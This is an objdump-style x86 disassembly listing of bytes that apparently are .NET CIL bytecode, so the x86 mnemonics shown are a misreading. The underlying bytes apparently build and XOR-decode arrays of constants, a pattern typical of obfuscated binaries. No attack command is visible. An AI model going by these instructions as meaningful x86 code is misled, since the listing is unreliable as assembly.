  40489a:	20 04 00             	and    %al,(%eax,%eax,1)
  40489d:	00 00                	add    %al,(%eax)
  40489f:	20 bc 00 00 00 20 dd 	and    %bh,-0x22e00000(%eax,%eax,1)
  4048a6:	00 00                	add    %al,(%eax)
  4048a8:	00 61 9d             	add    %ah,-0x63(%ecx)
  4048ab:	fe 09                	decb   (%ecx)
  4048ad:	05 00 71 03 00       	add    $0x37100,%eax
  4048b2:	00 01                	add    %al,(%ecx)
  4048b4:	20 05 00 00 00 7f    	and    %al,0x7f000000
  4048ba:	0e                   	push   %cs
  4048bb:	00 00                	add    %al,(%eax)
  4048bd:	04 d3                	add    $0xd3,%al
  4048bf:	20 05 00 00 00 58    	and    %al,0x58000000
  4048c5:	47                   	inc    %edi
  4048c6:	69 20 0a 00 00 00    	imul   $0xa,(%eax),%esp
  4048cc:	61                   	popa
  4048cd:	9d                   	popf
  4048ce:	fe 09                	decb   (%ecx)
  4048d0:	05 00 71 03 00       	add    $0x37100,%eax
  4048d5:	00 01                	add    %al,(%ecx)
  4048d7:	20 06                	and    %al,(%esi)
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	00 20                	add    %ah,(%eax)
  4048dd:	eb 00                	jmp    0x4048df
  4048df:	00 00                	add    %al,(%eax)
  4048e1:	20 88 00 00 00 61    	and    %cl,0x61000000(%eax)
  4048e7:	9d                   	popf
  4048e8:	fe 09                	decb   (%ecx)
  4048ea:	05 00 71 03 00       	add    $0x37100,%eax
  4048ef:	00 01                	add    %al,(%ecx)
  4048f1:	20 07                	and    %al,(%edi)
  4048f3:	00 00                	add    %al,(%eax)
  4048f5:	00 20                	add    %ah,(%eax)
  4048f7:	32 00                	xor    (%eax),%al
  4048f9:	00 00                	add    %al,(%eax)
  4048fb:	20 5a 00             	and    %bl,0x0(%edx)
  4048fe:	00 00                	add    %al,(%eax)
  404900:	61                   	popa
  404901:	9d                   	popf
  404902:	fe 09                	decb   (%ecx)
  404904:	05 00 71 03 00       	add    $0x37100,%eax
  404909:	00 01                	add    %al,(%ecx)
  40490b:	20 08                	and    %cl,(%eax)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	00 7f 0e             	add    %bh,0xe(%edi)
  404912:	00 00                	add    %al,(%eax)
  404914:	04 d3                	add    $0xd3,%al
  404916:	20 08                	and    %cl,(%eax)
  404918:	00 00                	add    %al,(%eax)
  40491a:	00 58 47             	add    %bl,0x47(%eax)
  40491d:	69 20 73 00 00 00    	imul   $0x73,(%eax),%esp
  404923:	61                   	popa
  404924:	9d                   	popf
  404925:	fe 09                	decb   (%ecx)
  404927:	05 00 71 03 00       	add    $0x37100,%eax
  40492c:	00 01                	add    %al,(%ecx)
  40492e:	20 09                	and    %cl,(%ecx)
  404930:	00 00                	add    %al,(%eax)
  404932:	00 20                	add    %ah,(%eax)
  404934:	df 00                	filds  (%eax)
  404936:	00 00                	add    %al,(%eax)
  404938:	20 a9 00 00 00 61    	and    %ch,0x61000000(%ecx)
  40493e:	9d                   	popf
  40493f:	fe 09                	decb   (%ecx)
  404941:	05 00 71 03 00       	add    $0x37100,%eax
  404946:	00 01                	add    %al,(%ecx)
  404948:	20 0a                	and    %cl,(%edx)
  40494a:	00 00                	add    %al,(%eax)
  40494c:	00 20                	add    %ah,(%eax)
  40494e:	7c 00                	jl     0x404950
  404950:	00 00                	add    %al,(%eax)
  404952:	20 19                	and    %bl,(%ecx)
  404954:	00 00                	add    %al,(%eax)
  404956:	00 61 9d             	add    %ah,-0x63(%ecx)
  404959:	fe 09                	decb   (%ecx)
  40495b:	05 00 71 03 00       	add    $0x37100,%eax
  404960:	00 01                	add    %al,(%ecx)
  404962:	20 0b                	and    %cl,(%ebx)
  404964:	00 00                	add    %al,(%eax)
  404966:	00 7f 0e             	add    %bh,0xe(%edi)
  404969:	00 00                	add    %al,(%eax)
  40496b:	04 d3                	add    $0xd3,%al
  40496d:	20 0b                	and    %cl,(%ebx)
  40496f:	00 00                	add    %al,(%eax)
  404971:	00 58 47             	add    %bl,0x47(%eax)
  404974:	69 20 fe 00 00 00    	imul   $0xfe,(%eax),%esp
  40497a:	61                   	popa
  40497b:	9d                   	popf
  40497c:	fe 09                	decb   (%ecx)
  40497e:	05 00 71 03 00       	add    $0x37100,%eax
  404983:	00 01                	add    %al,(%ecx)
  404985:	20 0c 00             	and    %cl,(%eax,%eax,1)
  404988:	00 00                	add    %al,(%eax)
  40498a:	7f 0e                	jg     0x40499a
  40498c:	00 00                	add    %al,(%eax)
  40498e:	04 d3                	add    $0xd3,%al
  404990:	20 0c 00             	and    %cl,(%eax,%eax,1)
  404993:	00 00                	add    %al,(%eax)
  404995:	58                   	pop    %eax
  404996:	47                   	inc    %edi
  404997:	69 20 49 00 00 00    	imul   $0x49,(%eax),%esp
  40499d:	61                   	popa
  40499e:	9d                   	popf
  40499f:	fe 09                	decb   (%ecx)
  4049a1:	05 00 71 03 00       	add    $0x37100,%eax
  4049a6:	00 01                	add    %al,(%ecx)
  4049a8:	20 0d 00 00 00 7f    	and    %cl,0x7f000000
  4049ae:	0e                   	push   %cs
  4049af:	00 00                	add    %al,(%eax)
  4049b1:	04 d3                	add    $0xd3,%al
  4049b3:	20 0d 00 00 00 58    	and    %cl,0x58000000
  4049b9:	47                   	inc    %edi
  4049ba:	69 20 78 00 00 00    	imul   $0x78,(%eax),%esp
  4049c0:	61                   	popa
  4049c1:	9d                   	popf
  4049c2:	fe 09                	decb   (%ecx)
  4049c4:	05 00 71 03 00       	add    $0x37100,%eax
  4049c9:	00 01                	add    %al,(%ecx)
  4049cb:	20 0e                	and    %cl,(%esi)
  4049cd:	00 00                	add    %al,(%eax)
  4049cf:	00 7f 0e             	add    %bh,0xe(%edi)
  4049d2:	00 00                	add    %al,(%eax)
  4049d4:	04 d3                	add    $0xd3,%al
  4049d6:	20 0e                	and    %cl,(%esi)
  4049d8:	00 00                	add    %al,(%eax)
  4049da:	00 58 47             	add    %bl,0x47(%eax)
  4049dd:	69 20 68 00 00 00    	imul   $0x68,(%eax),%esp
  4049e3:	61                   	popa
  4049e4:	9d                   	popf
  4049e5:	fe 09                	decb   (%ecx)
  4049e7:	05 00 71 03 00       	add    $0x37100,%eax
  4049ec:	00 01                	add    %al,(%ecx)
  4049ee:	20 0f                	and    %cl,(%edi)
  4049f0:	00 00                	add    %al,(%eax)
  4049f2:	00 7f 0e             	add    %bh,0xe(%edi)
  4049f5:	00 00                	add    %al,(%eax)
  4049f7:	04 d3                	add    $0xd3,%al
  4049f9:	20 0f                	and    %cl,(%edi)
  4049fb:	00 00                	add    %al,(%eax)
  4049fd:	00 58 47             	add    %bl,0x47(%eax)
  404a00:	69 20 83 00 00 00    	imul   $0x83,(%eax),%esp
  404a06:	61                   	popa
  404a07:	9d                   	popf
  404a08:	fe 09                	decb   (%ecx)
  404a0a:	05 00 71 03 00       	add    $0x37100,%eax
  404a0f:	00 01                	add    %al,(%ecx)
  404a11:	20 10                	and    %dl,(%eax)
  404a13:	00 00                	add    %al,(%eax)
  404a15:	00 7f 0e             	add    %bh,0xe(%edi)
  404a18:	00 00                	add    %al,(%eax)
  404a1a:	04 d3                	add    $0xd3,%al
  404a1c:	20 10                	and    %dl,(%eax)
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	00 58 47             	add    %bl,0x47(%eax)
  404a23:	69 20 a2 00 00 00    	imul   $0xa2,(%eax),%esp
  404a29:	61                   	popa
  404a2a:	9d                   	popf
  404a2b:	fe 09                	decb   (%ecx)
  404a2d:	05 00 71 03 00       	add    $0x37100,%eax
  404a32:	00 01                	add    %al,(%ecx)
  404a34:	20 11                	and    %dl,(%ecx)
  404a36:	00 00                	add    %al,(%eax)
  404a38:	00 20                	add    %ah,(%eax)
  404a3a:	e3 00                	jecxz  0x404a3c
  404a3c:	00 00                	add    %al,(%eax)
  404a3e:	20 8c 00 00 00 61 9d 	and    %cl,-0x629f0000(%eax,%eax,1)
  404a45:	fe 09                	decb   (%ecx)
  404a47:	05 00 71 03 00       	add    $0x37100,%eax
  404a4c:	00 01                	add    %al,(%ecx)
  404a4e:	20 12                	and    %dl,(%edx)
  404a50:	00 00                	add    %al,(%eax)
  404a52:	00 20                	add    %ah,(%eax)
  404a54:	1d 00 00 00 20       	sbb    $0x20000000,%eax
  404a59:	68 00 00 00 61       	push   $0x61000000
  404a5e:	9d                   	popf
  404a5f:	fe 09                	decb   (%ecx)
  404a61:	05 00 71 03 00       	add    $0x37100,%eax
  404a66:	00 01                	add    %al,(%ecx)
  404a68:	20 13                	and    %dl,(%ebx)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	00 20                	add    %ah,(%eax)
  404a6e:	76 00                	jbe    0x404a70
  404a70:	00 00                	add    %al,(%eax)
  404a72:	20 18                	and    %bl,(%eax)
  404a74:	00 00                	add    %al,(%eax)
  404a76:	00 61 9d             	add    %ah,-0x63(%ecx)
  404a79:	fe 09                	decb   (%ecx)
  404a7b:	05 00 71 03 00       	add    $0x37100,%eax
  404a80:	00 01                	add    %al,(%ecx)
  404a82:	20 14 00             	and    %dl,(%eax,%eax,1)
  404a85:	00 00                	add    %al,(%eax)
  404a87:	7f 0e                	jg     0x404a97
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 d3                	add    $0xd3,%al
  404a8d:	20 14 00             	and    %dl,(%eax,%eax,1)
  404a90:	00 00                	add    %al,(%eax)
  404a92:	58                   	pop    %eax
  404a93:	47                   	inc    %edi
  404a94:	69 20 44 00 00 00    	imul   $0x44,(%eax),%esp
  404a9a:	61                   	popa
  404a9b:	9d                   	popf
  404a9c:	fe 09                	decb   (%ecx)
  404a9e:	05 00 71 03 00       	add    $0x37100,%eax
  404aa3:	00 01                	add    %al,(%ecx)
  404aa5:	20 15 00 00 00 20    	and    %dl,0x20000000
  404aab:	ef                   	out    %eax,(%dx)
  404aac:	00 00                	add    %al,(%eax)
  404aae:	00 20                	add    %ah,(%eax)
  404ab0:	cf                   	iret
  404ab1:	00 00                	add    %al,(%eax)
  404ab3:	00 61 9d             	add    %ah,-0x63(%ecx)
  404ab6:	fe 09                	decb   (%ecx)
  404ab8:	05 00 71 03 00       	add    $0x37100,%eax
  404abd:	00 01                	add    %al,(%ecx)
  404abf:	20 16                	and    %dl,(%esi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 7f 0e             	add    %bh,0xe(%edi)
  404ac6:	00 00                	add    %al,(%eax)
  404ac8:	04 d3                	add    $0xd3,%al
  404aca:	20 16                	and    %dl,(%esi)
  404acc:	00 00                	add    %al,(%eax)
  404ace:	00 58 47             	add    %bl,0x47(%eax)
  404ad1:	69 20 1c 00 00 00    	imul   $0x1c,(%eax),%esp
  404ad7:	61                   	popa
  404ad8:	9d                   	popf
  404ad9:	fe 09                	decb   (%ecx)
  404adb:	05 00 71 03 00       	add    $0x37100,%eax
  404ae0:	00 01                	add    %al,(%ecx)
  404ae2:	20 17                	and    %dl,(%edi)
  404ae4:	00 00                	add    %al,(%eax)
  404ae6:	00 7f 0e             	add    %bh,0xe(%edi)
  404ae9:	00 00                	add    %al,(%eax)
  404aeb:	04 d3                	add    $0xd3,%al
  404aed:	20 17                	and    %dl,(%edi)
  404aef:	00 00                	add    %al,(%eax)
  404af1:	00 58 47             	add    %bl,0x47(%eax)
  404af4:	69 20 9e 00 00 00    	imul   $0x9e,(%eax),%esp
  404afa:	61                   	popa
  404afb:	9d                   	popf
  404afc:	fe 09                	decb   (%ecx)
  404afe:	05 00 71 03 00       	add    $0x37100,%eax
  404b03:	00 01                	add    %al,(%ecx)
  404b05:	20 18                	and    %bl,(%eax)
  404b07:	00 00                	add    %al,(%eax)
  404b09:	00 7f 0e             	add    %bh,0xe(%edi)
  404b0c:	00 00                	add    %al,(%eax)
  404b0e:	04 d3                	add    $0xd3,%al
  404b10:	20 18                	and    %bl,(%eax)
  404b12:	00 00                	add    %al,(%eax)
  404b14:	00 58 47             	add    %bl,0x47(%eax)
  404b17:	69 20 92 00 00 00    	imul   $0x92,(%eax),%esp
  404b1d:	61                   	popa
  404b1e:	9d                   	popf
  404b1f:	fe 09                	decb   (%ecx)
  404b21:	05 00 71 03 00       	add    $0x37100,%eax
  404b26:	00 01                	add    %al,(%ecx)
  404b28:	20 19                	and    %bl,(%ecx)
  404b2a:	00 00                	add    %al,(%eax)
  404b2c:	00 20                	add    %ah,(%eax)
  404b2e:	ec                   	in     (%dx),%al
  404b2f:	00 00                	add    %al,(%eax)
  404b31:	00 20                	add    %ah,(%eax)
  404b33:	cc                   	int3
  404b34:	00 00                	add    %al,(%eax)
  404b36:	00 61 9d             	add    %ah,-0x63(%ecx)
  404b39:	73 03                	jae    0x404b3e
  404b3b:	00 00                	add    %al,(%eax)
  404b3d:	0a fe                	or     %dh,%bh
  404b3f:	09 0b                	or     %ecx,(%ebx)
  404b41:	00 28                	add    %ch,(%eax)
  404b43:	0b 00                	or     (%eax),%eax
  404b45:	00 0a                	add    %cl,(%edx)
  404b47:	73 0c                	jae    0x404b55
  404b49:	00 00                	add    %al,(%eax)
  404b4b:	0a 7a 00             	or     0x0(%edx),%bh
  404b4e:	00 00                	add    %al,(%eax)
  404b50:	13 30                	adc    (%eax),%esi
  404b52:	02 00                	add    (%eax),%al
  404b54:	35 00 00 00 10       	xor    $0x10000000,%eax
  404b59:	00 00                	add    %al,(%eax)
  404b5b:	11 fe                	adc    %edi,%esi
  404b5d:	09 03                	or     %eax,(%ebx)
  404b5f:	00 26                	add    %ah,(%esi)
  404b61:	00 20                	add    %ah,(%eax)
  404b63:	01 00                	add    %eax,(%eax)
  404b65:	00 00                	add    %al,(%eax)
  404b67:	fe 0e                	decb   (%esi)
  404b69:	00 00                	add    %al,(%eax)
  404b6b:	fe 09                	decb   (%ecx)
  404b6d:	09 00                	or     %eax,(%eax)
  404b6f:	fe 0c 00             	decb   (%eax,%eax,1)
  404b72:	00 81 04 00 00 01    	add    %al,0x1000004(%ecx)
  404b78:	fe 09                	decb   (%ecx)
  404b7a:	01 00                	add    %eax,(%eax)
  404b7c:	20 06                	and    %al,(%esi)
  404b7e:	00 00                	add    %al,(%eax)
  404b80:	00 54 fe 09          	add    %dl,0x9(%esi,%edi,8)
  404b84:	02 00                	add    (%eax),%al
  404b86:	20 03                	and    %al,(%ebx)
  404b88:	00 00                	add    %al,(%eax)
  404b8a:	00 54 fe 0c          	add    %dl,0xc(%esi,%edi,8)
  404b8e:	01 00                	add    %eax,(%eax)
  404b90:	2a 00                	sub    (%eax),%al
  404b92:	00 00                	add    %al,(%eax)
  404b94:	1b 30                	sbb    (%eax),%esi
  404b96:	0c 00                	or     $0x0,%al
  404b98:	d6                   	salc
  404b99:	0a 00                	or     (%eax),%al
  404b9b:	00 11                	add    %dl,(%ecx)
  404b9d:	00 00                	add    %al,(%eax)
  404b9f:	11 17                	adc    %edx,(%edi)
  404ba1:	8d 11                	lea    (%ecx),%edx
  404ba3:	00 00                	add    %al,(%eax)
  404ba5:	01 0a                	add    %ecx,(%edx)
  404ba7:	17                   	pop    %ss
  404ba8:	8d 12                	lea    (%edx),%edx
  404baa:	00 00                	add    %al,(%eax)
  404bac:	01 0b                	add    %ecx,(%ebx)
  404bae:	06                   	push   %es
  404baf:	16                   	push   %ss
  404bb0:	d0 03                	rolb   $1,(%ebx)
  404bb2:	00 00                	add    %al,(%eax)
  404bb4:	01 a4 11 00 00 01 7f 	add    %esp,0x7f010000(%ecx,%edx,1)
  404bbb:	0c 00                	or     $0x0,%al
  404bbd:	00 04 0c             	add    %al,(%esp,%ecx,1)
  404bc0:	12 03                	adc    (%ebx),%al
  404bc2:	25 17 54 46 1a       	and    $0x1a465417,%eax
  404bc7:	5a                   	pop    %edx
  404bc8:	13 04 16             	adc    (%esi,%edx,1),%eax
  404bcb:	13 05 16 13 06 16    	adc    0x16061316,%eax
  404bd1:	13 06                	adc    (%esi),%eax
  404bd3:	00 11                	add    %dl,(%ecx)
  404bd5:	06                   	push   %es
  404bd6:	1b 33                	sbb    (%ebx),%esi
  404bd8:	08 16                	or     %dl,(%esi)
  404bda:	13 06                	adc    (%esi),%eax
  404bdc:	dd 91 0a 00 00 00    	fstl   0xa(%ecx)
  404be2:	11 06                	adc    %eax,(%esi)
  404be4:	1c 33                	sbb    $0x33,%al
  404be6:	10 16                	adc    %dl,(%esi)
  404be8:	13 06                	adc    (%esi),%eax
  404bea:	11 07                	adc    %eax,(%edi)
  404bec:	13 08                	adc    (%eax),%ecx
  404bee:	11 08                	adc    %ecx,(%eax)
  404bf0:	13 09                	adc    (%ecx),%ecx
  404bf2:	38 db                	cmp    %bl,%bl
  404bf4:	06                   	push   %es
  404bf5:	00 00                	add    %al,(%eax)
  404bf7:	00 12                	add    %dl,(%edx)
  404bf9:	05 12 06 12 07       	add    $0x7120612,%eax
  404bfe:	11 0a                	adc    %ecx,(%edx)
  404c00:	12 0b                	adc    (%ebx),%cl
  404c02:	12 0c 12             	adc    (%edx,%edx,1),%cl
  404c05:	0d 12 0e 12 0f       	or     $0xf120e12,%eax
  404c0a:	12 10                	adc    (%eax),%dl
  404c0c:	7e 04                	jle    0x404c12
  404c0e:	00 00                	add    %al,(%eax)
  404c10:	04 11                	add    $0x11,%al
  404c12:	05 97 29 12 00       	add    $0x122997,%eax
  404c17:	00 11                	add    %dl,(%ecx)
  404c19:	13 11                	adc    (%ecx),%edx
  404c1b:	2b b6 00 11 12 13    	sub    0x13121100(%esi),%esi
  404c21:	13 08                	adc    (%eax),%ecx
  404c23:	11 13                	adc    %edx,(%ebx)
  404c25:	18 9a a5 04 00 00    	sbb    %bl,0x4a5(%edx)
  404c2b:	01 58 1f             	add    %ebx,0x1f(%eax)
  404c2e:	28 58 11             	sub    %bl,0x11(%eax)
  404c31:	04 58                	add    $0x58,%al
  404c33:	4a                   	dec    %edx
  404c34:	13 14 00             	adc    (%eax,%eax,1),%edx
  404c37:	11 14 15 33 05 38 2f 	adc    %edx,0x2f380533(,%edx,1)
  404c3e:	02 00                	add    (%eax),%al
  404c40:	00 00                	add    %al,(%eax)
  404c42:	08 11                	or     %dl,(%ecx)
  404c44:	14 58                	adc    $0x58,%al
  404c46:	1e                   	push   %ds
  404c47:	58                   	pop    %eax
  404c48:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404c4b:	4a                   	dec    %edx
  404c4c:	13 15 16 11 15 2e    	adc    0x2e151116,%edx
  404c52:	0d 17 11 15 3b       	or     $0x3b151117,%eax
  404c57:	99                   	cltd
  404c58:	01 00                	add    %eax,(%eax)
  404c5a:	00 38                	add    %bh,(%eax)
  404c5c:	10 02                	adc    %al,(%edx)
  404c5e:	00 00                	add    %al,(%eax)
  404c60:	00 08                	add    %cl,(%eax)
  404c62:	11 14 58             	adc    %edx,(%eax,%ebx,2)
  404c65:	1f                   	pop    %ds
  404c66:	10 58 11             	adc    %bl,0x11(%eax)
  404c69:	04 58                	add    $0x58,%al
  404c6b:	4a                   	dec    %edx
  404c6c:	13 16                	adc    (%esi),%edx
  404c6e:	11 16                	adc    %edx,(%esi)
  404c70:	15 2e 39 07 11       	adc    $0x1107392e,%eax
  404c75:	16                   	push   %ss
  404c76:	9a 25 14 33 16 26 07 	lcall  $0x726,$0x16331425
  404c7d:	11 16                	adc    %edx,(%esi)
  404c7f:	06                   	push   %es
  404c80:	11 16                	adc    %edx,(%esi)
  404c82:	a3 11 00 00 01       	mov    %eax,0x1000011
  404c87:	28 0d 00 00 0a a2    	sub    %cl,0xa20a0000
  404c8d:	07                   	pop    %es
  404c8e:	11 16                	adc    %edx,(%esi)
  404c90:	9a 00 11 13 1a 9a 28 	lcall  $0x289a,$0x1a131100
  404c97:	0e                   	push   %cs
  404c98:	00 00                	add    %al,(%eax)
  404c9a:	0a 2d 0f 08 11 14    	or     0x1411080f,%ch
  404ca0:	58                   	pop    %eax
  404ca1:	1f                   	pop    %ds
  404ca2:	28 58 11             	sub    %bl,0x11(%eax)
  404ca5:	04 58                	add    $0x58,%al
  404ca7:	4a                   	dec    %edx
  404ca8:	13 14 2b             	adc    (%ebx,%ebp,1),%edx
  404cab:	8a 00                	mov    (%eax),%al
  404cad:	11 14 13             	adc    %edx,(%ebx,%edx,1)
  404cb0:	17                   	pop    %ss
  404cb1:	08 08                	or     %cl,(%eax)
  404cb3:	11 17                	adc    %edx,(%edi)
  404cb5:	58                   	pop    %eax
  404cb6:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404cb9:	4a                   	dec    %edx
  404cba:	58                   	pop    %eax
  404cbb:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404cbe:	4a                   	dec    %edx
  404cbf:	13 18                	adc    (%eax),%ebx
  404cc1:	11 13                	adc    %edx,(%ebx)
  404cc3:	1b 9a a5 04 00 00    	sbb    0x4a5(%edx),%ebx
  404cc9:	01 13                	add    %edx,(%ebx)
  404ccb:	19 00                	sbb    %eax,(%eax)
  404ccd:	11 19                	adc    %ebx,(%ecx)
  404ccf:	11 18                	adc    %ebx,(%eax)
  404cd1:	33 7b 08             	xor    0x8(%ebx),%edi
  404cd4:	11 17                	adc    %edx,(%edi)
  404cd6:	58                   	pop    %eax
  404cd7:	1f                   	pop    %ds
  404cd8:	38 58 11             	cmp    %bl,0x11(%eax)
  404cdb:	04 58                	add    $0x58,%al
  404cdd:	4a                   	dec    %edx
  404cde:	13 1a                	adc    (%edx),%ebx
  404ce0:	11 13                	adc    %edx,(%ebx)
  404ce2:	1a 9a 13 0a 11 12    	sbb    0x12110a13(%edx),%bl
  404ce8:	17                   	pop    %ss
  404ce9:	9a 74 01 00 00 1b 13 	lcall  $0x131b,$0x174
  404cf0:	12 1e                	adc    (%esi),%bl
  404cf2:	8d 03                	lea    (%ebx),%eax
  404cf4:	00 00                	add    %al,(%eax)
  404cf6:	01 13                	add    %edx,(%ebx)
  404cf8:	1b 11                	sbb    (%ecx),%edx
  404cfa:	1b 16                	sbb    (%esi),%edx
  404cfc:	17                   	pop    %ss
  404cfd:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404d00:	00 01                	add    %al,(%ecx)
  404d02:	a2 11 1b 17 11       	mov    %al,0x11171b11
  404d07:	12 a2 11 1b 1a 11    	adc    0x111a1b11(%edx),%ah
  404d0d:	13 1a                	adc    (%edx),%ebx
  404d0f:	9a a2 11 1b 1b 11 13 	lcall  $0x1311,$0x1b1b11a2
  404d16:	1b 9a a5 04 00 00    	sbb    0x4a5(%edx),%ebx
  404d1c:	01 8c 04 00 00 01 a2 	add    %ecx,-0x5dff0000(%esp,%eax,1)
  404d23:	11 1b                	adc    %ebx,(%ebx)
  404d25:	18 11                	sbb    %dl,(%ecx)
  404d27:	17                   	pop    %ss
  404d28:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404d2b:	00 01                	add    %al,(%ecx)
  404d2d:	a2 11 1b 1d 18       	mov    %al,0x181d1b11
  404d32:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404d35:	00 01                	add    %al,(%ecx)
  404d37:	a2 11 1b 13 12       	mov    %al,0x12131b11
  404d3c:	08 11                	or     %dl,(%ecx)
  404d3e:	17                   	pop    %ss
  404d3f:	58                   	pop    %eax
  404d40:	1f                   	pop    %ds
  404d41:	38 58 11             	cmp    %bl,0x11(%eax)
  404d44:	04 58                	add    $0x58,%al
  404d46:	4a                   	dec    %edx
  404d47:	13 05 38 85 fe ff    	adc    0xfffe8538,%eax
  404d4d:	ff 00                	incl   (%eax)
  404d4f:	08 11                	or     %dl,(%ecx)
  404d51:	19 58 1f             	sbb    %ebx,0x1f(%eax)
  404d54:	10 58 11             	adc    %bl,0x11(%eax)
  404d57:	04 58                	add    $0x58,%al
  404d59:	4a                   	dec    %edx
  404d5a:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  404d5d:	1c 15                	sbb    $0x15,%al
  404d5f:	3b 80 00 00 00 08    	cmp    0x8000000(%eax),%eax
  404d65:	11 1c 58             	adc    %ebx,(%eax,%ebx,2)
  404d68:	1f                   	pop    %ds
  404d69:	38 58 11             	cmp    %bl,0x11(%eax)
  404d6c:	04 58                	add    $0x58,%al
  404d6e:	4a                   	dec    %edx
  404d6f:	13 1a                	adc    (%edx),%ebx
  404d71:	11 12                	adc    %edx,(%edx)
  404d73:	17                   	pop    %ss
  404d74:	9a 74 01 00 00 1b 13 	lcall  $0x131b,$0x174
  404d7b:	12 1e                	adc    (%esi),%bl
  404d7d:	8d 03                	lea    (%ebx),%eax
  404d7f:	00 00                	add    %al,(%eax)
  404d81:	01 13                	add    %edx,(%ebx)
  404d83:	1b 11                	sbb    (%ecx),%edx
  404d85:	1b 16                	sbb    (%esi),%edx
  404d87:	17                   	pop    %ss
  404d88:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404d8b:	00 01                	add    %al,(%ecx)
  404d8d:	a2 11 1b 17 11       	mov    %al,0x11171b11
  404d92:	12 a2 11 1b 1a 11    	adc    0x111a1b11(%edx),%ah
  404d98:	13 1a                	adc    (%edx),%ebx
  404d9a:	9a a2 11 1b 1b 11 13 	lcall  $0x1311,$0x1b1b11a2
  404da1:	1b 9a a5 04 00 00    	sbb    0x4a5(%edx),%ebx
  404da7:	01 8c 04 00 00 01 a2 	add    %ecx,-0x5dff0000(%esp,%eax,1)
  404dae:	11 1b                	adc    %ebx,(%ebx)
  404db0:	18 11                	sbb    %dl,(%ecx)
  404db2:	1c 8c                	sbb    $0x8c,%al
  404db4:	04 00                	add    $0x0,%al
  404db6:	00 01                	add    %al,(%ecx)
  404db8:	a2 11 1b 1c 11       	mov    %al,0x111c1b11
  404dbd:	17                   	pop    %ss
  404dbe:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404dc1:	00 01                	add    %al,(%ecx)
  404dc3:	a2 11 1b 1d 16       	mov    %al,0x161d1b11
  404dc8:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404dcb:	00 01                	add    %al,(%ecx)
  404dcd:	a2 11 1b 13 12       	mov    %al,0x12131b11
  404dd2:	08 11                	or     %dl,(%ecx)
  404dd4:	1c 58                	sbb    $0x58,%al
  404dd6:	1f                   	pop    %ds
  404dd7:	38 58 11             	cmp    %bl,0x11(%eax)
  404dda:	04 58                	add    $0x58,%al
  404ddc:	4a                   	dec    %edx
  404ddd:	13 05 38 ef fd ff    	adc    0xfffdef38,%eax
  404de3:	ff 00                	incl   (%eax)
  404de5:	08 11                	or     %dl,(%ecx)
  404de7:	19 58 11             	sbb    %ebx,0x11(%eax)
  404dea:	04 58                	add    $0x58,%al
  404dec:	4a                   	dec    %edx
  404ded:	13 19                	adc    (%ecx),%ebx
  404def:	38 d8                	cmp    %bl,%al
  404df1:	fe                   	(bad)
  404df2:	ff                   	(bad)
  404df3:	ff 00                	incl   (%eax)
  404df5:	08 11                	or     %dl,(%ecx)
  404df7:	14 58                	adc    $0x58,%al
  404df9:	1f                   	pop    %ds
  404dfa:	20 58 11             	and    %bl,0x11(%eax)
  404dfd:	04 58                	add    $0x58,%al
  404dff:	4a                   	dec    %edx
  404e00:	13 1a                	adc    (%edx),%ebx
  404e02:	11 13                	adc    %edx,(%ebx)
  404e04:	1a 9a 13 0a 11 12    	sbb    0x12110a13(%edx),%bl
  404e0a:	17                   	pop    %ss
  404e0b:	9a 74 01 00 00 1b 13 	lcall  $0x131b,$0x174
  404e12:	12 1e                	adc    (%esi),%bl
  404e14:	8d 03                	lea    (%ebx),%eax
  404e16:	00 00                	add    %al,(%eax)
  404e18:	01 13                	add    %edx,(%ebx)
  404e1a:	1b 11                	sbb    (%ecx),%edx
  404e1c:	1b 16                	sbb    (%esi),%edx
  404e1e:	17                   	pop    %ss
  404e1f:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404e22:	00 01                	add    %al,(%ecx)
  404e24:	a2 11 1b 17 11       	mov    %al,0x11171b11
  404e29:	12 a2 11 1b 1a 11    	adc    0x111a1b11(%edx),%ah
  404e2f:	13 1a                	adc    (%edx),%ebx
  404e31:	9a a2 11 1b 1b 11 13 	lcall  $0x1311,$0x1b1b11a2
  404e38:	1b 9a a5 04 00 00    	sbb    0x4a5(%edx),%ebx
  404e3e:	01 8c 04 00 00 01 a2 	add    %ecx,-0x5dff0000(%esp,%eax,1)
  404e45:	11 1b                	adc    %ebx,(%ebx)
  404e47:	18 11                	sbb    %dl,(%ecx)
  404e49:	14 8c                	adc    $0x8c,%al
  404e4b:	04 00                	add    $0x0,%al
  404e4d:	00 01                	add    %al,(%ecx)
  404e4f:	a2 11 1b 1d 17       	mov    %al,0x171d1b11
  404e54:	8c 04 00             	mov    %es,(%eax,%eax,1)
  404e57:	00 01                	add    %al,(%ecx)
  404e59:	a2 11 1b 13 12       	mov    %al,0x12131b11
  404e5e:	08 11                	or     %dl,(%ecx)
  404e60:	14 58                	adc    $0x58,%al
  404e62:	1f                   	pop    %ds
  404e63:	20 58 11             	and    %bl,0x11(%eax)
  404e66:	04 58                	add    $0x58,%al
  404e68:	4a                   	dec    %edx
  404e69:	13 05 38 63 fd ff    	adc    0xfffd6338,%eax
  404e6f:	ff 00                	incl   (%eax)
  404e71:	11 12                	adc    %edx,(%edx)
  404e73:	17                   	pop    %ss
  404e74:	9a 74 01 00 00 1b 13 	lcall  $0x131b,$0x174
  404e7b:	12 11                	adc    (%ecx),%dl
  404e7d:	13 1a                	adc    (%edx),%ebx
  404e7f:	9a 13 1d 11 13 1b 9a 	lcall  $0x9a1b,$0x13111d13
  404e86:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404e87:	04 00                	add    $0x0,%al
  404e89:	00 01                	add    %al,(%ecx)
  404e8b:	13 1e                	adc    (%esi),%ebx
  404e8d:	2b 00                	sub    (%eax),%eax
  404e8f:	00 11                	add    %dl,(%ecx)
  404e91:	05 13 14 11 14       	add    $0x14111413,%eax
